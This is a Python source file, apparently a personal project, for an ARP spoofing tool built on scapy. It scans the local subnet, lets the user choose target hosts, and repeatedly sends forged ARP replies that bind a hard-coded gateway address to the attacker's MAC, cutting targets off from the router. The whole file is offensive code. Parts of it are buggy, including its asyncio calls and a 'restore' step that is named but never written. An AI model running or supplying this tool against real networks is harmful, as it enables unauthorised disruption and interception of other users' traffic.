#scan select spoof restore




import scapy.all as scapy

import os
import asyncio
import subprocess
import uuid
import socket
import ifcfg
from textual.app import App,ComposeResult
from textual.widgets import Label,Button,Welcome
import time

def mainer(f):
    def wrap():
        # print(f"got function {f.__name__}")
        try:
            f()
        except Exception as e:
            if(str(e) == "[Errno 1] Operation not permitted"):
                print("must run as root")
                return
            raise e
    return wrap
class arptypes():
    isat = "is-at"
    whohas = "who-has"
    ping = "ping"
    
    

def builtarppacket(dst:tuple,srcIsAt:tuple,arptype:str) -> bytes:
    

    # if len(dst)==0:
    #     raise Exception(f"dst tuple doesn't have enough items expected:2 got:{len(dst)}")
    # just send to braodcast
    if len(srcIsAt)<2:
        raise Exception(f"srcIsAt tuple doesn't have enough items expected:2 got:{len(srcIsAt)}")
        return
    set_ip,set_mac = srcIsAt
    dst_ip,dst_mac= dst
    if "/" not in dst_ip and (None in (dst_ip,dst_mac) or "" in (dst_mac.strip(),dst_ip.strip()) or dst_mac.count(":") !=5 or dst_ip.count(".") !=4):
        #sending braodcast if the target addr is bad
        dst_ip,dst_mac = None,None
    #the / is used to decler the netwrok leyers
    #5 application
    #4 transport(protocol)
    #4 network(ip)
    #2 data link(ethernet/wifi)
    #1 physical
    match arptype:
        case arptypes.isat:
            l2 = scapy.Ether(dst=dst_mac)
            l3 = scapy.ARP(op=arptype,pdst=dst_ip,psrc=set_ip,hwsrc=set_mac,hwdst=set_mac)
            packet = l2/l3
        case arptypes.whohas:
            l2 = scapy.Ether(dst=dst_mac)
            l3 = scapy.ARP(op=arptype,pdst=dst_ip,psrc=set_ip,hwsrc=set_mac,hwdst=set_mac)
            packet = l2/l3
        case arptypes.ping:
            packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=dst_ip)
    #ahh send is for layer 2 and lower(simpler packets) and sendp is for the other layers
    return packet
    # scapy.sendp(packet,loop=1,verbose=False)#sendp is for packet object and send is raw bytes 
def getmymac()->str:
    mymac = uuid.getnode()
    mymac = uuid.UUID(int=mymac).hex[-12:]
    mymac = ":".join([mymac[x]+mymac[x+1] for x in range(0,11,2)])
    return mymac

def getsubnet()->int:
    output = 0
    # for x in ifcfg.interfaces().items():
    #     print(scapy.conf.iface)
    #     output.append((x[0],x[1]['netmask']))
    mask = ifcfg.interfaces()[scapy.conf.iface]['netmask']
    mask = mask.split('.')
    for x in mask:
        output += str(bin(int(x))).count('1')
    return output

def selectinterface(iface:str)->bool:
    if iface not in scapy.conf.ifaces:
        return 0
    scapy.InterfaceProvider.load(iface)
    return 1
def thispcay()->tuple:
    mymac = getmymac()
    myip = socket.gethostbyname(socket.gethostname())
    return (myip,mymac)
def Scanenetwork(timeout:int =2,subnet:str=None) -> dict:
    #fix this
    #ip -> mac
    #use the arp command announcement
    # print(subprocess.run("arp".split(" "),capture_output=True).stdout.decode())
    src = thispcay()
    if (subnet == None):
        subnet = f"{src[0]}/{getsubnet()}"

    
    #arp ping Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")
    res, _ = scapy.srp(builtarppacket((subnet,""),src,arptypes.ping),timeout=timeout,verbose=False) # listen for packets
    # res = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst="192.168.1.0/24"),timeout=timeout)
    output = {}
    for x in res:
        mac = x.answer.src
        ip = x.answer.psrc
        output[ip] = mac
    return output
    
    
class Data:
    clientsFound:dict={} # {ip:mac,...}
    Scan = True
    TargetedClients = []
    attack = False
    
async def ScanForever()->None:
    print("starting to scan")
    Data.clientsFound = Scanenetwork(0.5)
    while Data.Scan:
        items = Scanenetwork(5)
        for ip,mac in items.items():
            Data.clientsFound[ip] = mac

def ask(q:str,possibleanswers:list) -> str:
    output = input(q)
    if "*" in possibleanswers:
        return output
    else:
        if output in possibleanswers:
            return output
        else:
            return ask(q,possibleanswers)
async def Spoof(Targets:list=Data.TargetedClients)->None:
    #currently just blocking the communication with the router
    gateway = "192.168.30.1"
    while Data.attack:
        for ip,mac in Targets:
            scapy.sendp(builtarppacket((ip,mac),(gateway,getmymac()),arptypes.isat))
            print("sending")
    print("attack stopped")
    
    
def StopAll()->None:
    print(asyncio.Task.all_tasks())
    Data.attack=False
    Data.Scan=False
    for task in asyncio.Task.all_tasks():
        task.cancel()
        
def menus(number:int|str=0)->None:
    print(asyncio.Task.get_coro())
    #o display menus
    #1 display and pick clients to target
    
        
    menusdict = {
        "0":"menus",
        "1": "pick clients"
    }
    pickedmenu = 0
    
    match int(number):
        case 0:
            print("\n".join([f"{x[0]}: {x[1]}" for x in menusdict.items()]))
            pickedmenu = ask("pick a menu by its number:",["*"])
        case 1:
            Data.attack = False #stoppping all current attacks
            clients = list(Data.clientsFound.items())
            print(f"currently targets:{Data.TargetedClients}")
            print("\n".join([ f"{x+1}:{clients[x][0]} -> {clients[x][1]}" for x in range(len(clients))]))
            newtargetsidx = ask("type clients you want to target by their number with comma(,) between numbers, enter 0 to keep the current ones:",["*"])
            newtargets = []
            if newtargetsidx != "0":
                newtargetsidx = newtargetsidx.split(",")
                for idx in newtargetsidx:
                    try:
                        idx = int(idx)-1
                        newtargets.append(clients[idx])
                    except:
                        print(f"index {idx} does not exist in the list")
            else:
                newtargets=Data.TargetedClients
            Data.TargetedClients = newtargets
            print(f"updated targets:{[x[0] for x in Data.TargetedClients]}")
            Data.attack = True
            asyncio.create_task(Spoof())
    if str(pickedmenu) in menusdict.keys():
        menus(pickedmenu)
    else:
        if not str(pickedmenu).isnumeric():
            if str(pickedmenu).lower() in ["q","exit","quit"]:
                print("goodbye")
                return
        print(f"menu:{pickedmenu} is unavailable")
        menus(0)
    
    
#@mainer
async def main()->None:
    # scapy.sendp(builtarppacket((None,None),("192.168.16.20","aa:aa:aa:aa:aa:aa")))
        # print(Scanenetwork(2))
        asyncio.create_task(ScanForever())
        asyncio.create_task(menus())
        StopAll()
        
        
        
asyncio.run(main())